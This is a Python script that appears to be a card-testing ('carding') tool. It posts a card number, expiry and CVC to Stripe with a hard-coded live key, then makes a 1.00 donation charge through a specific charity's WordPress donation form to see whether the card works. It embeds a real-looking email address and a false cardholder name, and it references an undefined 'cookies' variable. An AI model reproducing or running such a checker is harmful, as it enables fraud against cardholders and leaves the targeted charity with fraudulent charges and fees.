import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
	    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en-GB;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&billing_details[name]=Benni+Ent+&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=b7638857-3ba5-439e-83b0-5e8fce102f8e462dc0&muid=7db7936d-7e7c-4c86-afef-698110aebe5ea4f190&sid=fe2548fd-f7e8-410a-9b29-bf7117d1bdd465bccc&pasted_fields=number&payment_user_agent=stripe.js%2F35d1c775d8%3B+stripe-js-v3%2F35d1c775d8%3B+card-element&key=pk_live_51JFgfTKqjmzJCbSr9wtxl0XojHckW6m9jJFVUKw1MHDix6dpGRuJAPXV0LRBU5y5r5FmIq8c3EVywaikYyU45Wg600Va8cE1WA'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

	pm = r1.json()['id']
	
	headers = {
	    'authority': 'levcomhub.com',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en-GB;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://levcomhub.com',
    'referer': 'https://levcomhub.com/donate/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
	}

				
	data = {
	    'action': 'wp_full_stripe_inline_donation_charge',
    'wpfs-form-name': 'leverhulme_community_hub',
    'wpfs-form-get-parameters': '%7B%7D',
    'wpfs-custom-amount': '1.00',
    'wpfs-donation-frequency': 'one-time',
    'wpfs-custom-input[]': 'Y',
    'wpfs-card-holder-email': 'goldcalture99@gmail.com',
    'wpfs-card-holder-name': 'Benni Ent ',
    'wpfs-terms-of-use-accepted': '1',
    'wpfs-custom-amount-index': '0',
    'wpfs-stripe-payment-method-id': f'{pm}', 
    }
	
	r2 = requests.post(
	    'https://levcomhub.com/wp-admin/admin-ajax.php',
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	return (r2.json())
